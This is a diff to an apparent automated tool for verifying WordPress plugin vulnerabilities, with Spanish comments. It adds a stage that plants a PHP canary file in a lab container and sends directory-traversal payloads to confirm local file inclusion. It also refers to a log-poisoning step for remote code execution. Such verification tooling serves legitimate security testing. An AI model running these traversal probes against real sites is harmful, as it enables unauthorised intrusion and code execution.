@@ -3063,7 +3063,7 @@ def verify_wordpress_path_traversal(
             import re as _re_menu19
             _grep19 = subprocess.run(
                 ["grep", "-rh", "add_menu_page", plugin_source_dir,
-                 "--include=*.php", "-m1"],
+                 "--include=*.php", "-A4", "-m5"],
                 capture_output=True, text=True, timeout=10)
             _slug19_m = _re_menu19.search(
                 r"add_menu_page\s*\([^,]+,[^,]+,[^,]+,\s*['\"]([^'\"]+)['\"]",
@@ -3398,7 +3398,7 @@ def verify_wordpress_lfi(
             import re as _re_menu19_lfi
             _grep19_lfi = subprocess.run(
                 ["grep", "-rh", "add_menu_page", plugin_source_dir,
-                 "--include=*.php", "-m1"],
+                 "--include=*.php", "-A4", "-m5"],
                 capture_output=True, text=True, timeout=10)
             _slug19_lfi_m = _re_menu19_lfi.search(
                 r"add_menu_page\s*\([^,]+,[^,]+,[^,]+,\s*['\"]([^'\"]+)['\"]",
@@ -3489,6 +3489,45 @@ def verify_wordpress_lfi(
                     break
         res.evidence["lfi_lectura_intentos"] = read_tried
 
+        # ── nivel 1b: PHP-canary (require_once/include con sufijo .php hardcoded) ───
+        # Cubre casos como require_once __DIR__.'/tabs/'.$tab.'.php': PHP añade .php
+        # al path → el canario .txt nunca aparece. Solución: plantar /tmp/TOKEN.php
+        # con <?php echo 'SECRET'; ?> y sondear SIN extension (PHP añade .php sola).
+        php_canary_found = False
+        php_canary_tried = []
+        if not read_found and time.time() - t0 < budget_s - 60:
+            _php_lfi_secret = secrets.token_hex(16)
+            _php_lfi_token = _token()
+            _php_lfi_path = f"/tmp/binoracle_canary_{_php_lfi_token}.php"
+            step(f"plantando canario PHP en {_php_lfi_path} para PHP-include con sufijo .php...")
+            _php_lfi_ok = boot.lab.write_canary(_php_lfi_path, f"<?php echo '{_php_lfi_secret}'; ?>")
+            if _php_lfi_ok:
+                # Canario sin extension — PHP añade .php: /tmp/binoracle_canary_TOKEN
+                _php_lfi_bare = f"tmp/binoracle_canary_{_php_lfi_token}"
+                for _n_lfi in range(1, 13):
+                    _php_lfi_val = ("../" * _n_lfi) + _php_lfi_bare
+                    _php_pl = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+                    _php_pl[path_param] = _php_lfi_val
+                    step(f"probando PHP-include canario: {path_param}={_php_lfi_val!r}...")
+                    try:
+                        _php_lfi_resp = _lfi_sess.request(
+                            m, boot.base_url + endpoint, timeout=20,
+                            data=_php_pl if m != "GET" else None,
+                            params=_php_pl if m == "GET" else None)
+                        _php_lfi_text = _php_lfi_resp.text or ""
+                        _php_lfi_hit = _php_lfi_secret in _php_lfi_text
+                        php_canary_tried.append({"payload": _php_lfi_val, "status": _php_lfi_resp.status_code, "hit": _php_lfi_hit})
+                        if _php_lfi_hit:
+                            php_canary_found = True
+                            res.evidence["lfi_php_canary_payload"] = _php_lfi_val
+                            res.evidence["lfi_php_canary_fragmento"] = _php_lfi_text[:400]
+                            step(f"PHP-INCLUDE LFI confirmado: {path_param}={_php_lfi_val!r} "
+                                 f"ejecuto el canario PHP (secreto encontrado en la respuesta).")
+                            break
+                    except Exception as _e:
+                        php_canary_tried.append({"payload": _php_lfi_val, "error": str(_e)})
+            res.evidence["lfi_php_canary_intentos"] = php_canary_tried
+
         # ── nivel 2: LFI-a-RCE via envenenamiento del log de Apache ─────
         # Solo se intenta si Docker esta disponible (el lab ya lo usa) y no ha
         # expirado el budget. Se prueba independientemente del nivel 1 -- si
@@ -3559,6 +3598,15 @@ def verify_wordpress_lfi(
                 f"{res.evidence['lfi_rce_payload']!r} el codigo SE EJECUTO de verdad "
                 f"(el marcador aparecio sin etiquetas PHP) -- ejecucion remota de codigo "
                 f"a partir de un Local File Inclusion")
+        elif php_canary_found:
+            res.verified = True
+            res.ok = True
+            res.detail = (
+                f"PHP-INCLUDE LFI confirmado (canario PHP): "
+                f"{path_param}={res.evidence['lfi_php_canary_payload']!r} ejecuto el "
+                f"canario PHP plantado en /tmp/ (secreto encontrado en la respuesta) -- "
+                f"el plugin hace require_once/include con sufijo .php hardcoded, "
+                f"permitiendo traversal de directorios")
         elif read_found:
             res.verified = True
             res.ok = True
